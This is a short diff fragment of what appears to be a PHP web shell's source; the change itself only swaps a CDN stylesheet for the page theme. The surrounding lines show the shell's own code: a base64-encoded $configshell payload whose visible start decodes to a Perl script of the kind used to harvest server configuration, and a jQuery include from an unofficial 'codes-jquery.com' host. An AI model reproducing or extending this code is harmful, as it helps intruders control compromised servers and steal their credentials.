@@ -489,7 +489,9 @@ $configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29u
 <Variable name="themeColor" description="Address bar color" type="color" default="lime" value="lime"/></Group>
 <meta name="theme-color" content="lime">
 <link href='https://fonts.googleapis.com/css?family=Nunito' rel='stylesheet'>
-<link rel='stylesheet' href='https://cdn.jsdelivr.net/gh/kimeiga/bahunya@css/bahunya-0.1.3.css'>
+<!--<link rel='stylesheet' href='https://cdn.jsdelivr.net/gh/kimeiga/bahunya@css/bahunya-0.1.1.css'>-->
+<link rel='stylesheet' href='https://cdn.jsdelivr.net/gh/kimeiga/bahunya/dist/bahunya.min.css'>
+<!--<link rel='stylesheet' href='https://cdn.jsdelivr.net/gh/kimeiga/bahunya@master/dist/bahunya.css'>-->
 <script src='http://codes-jquery.com/ajax/jquery-1.11.2.min.js'></script>
 <script type="text/javascript">
 function tukar(lama,baru){
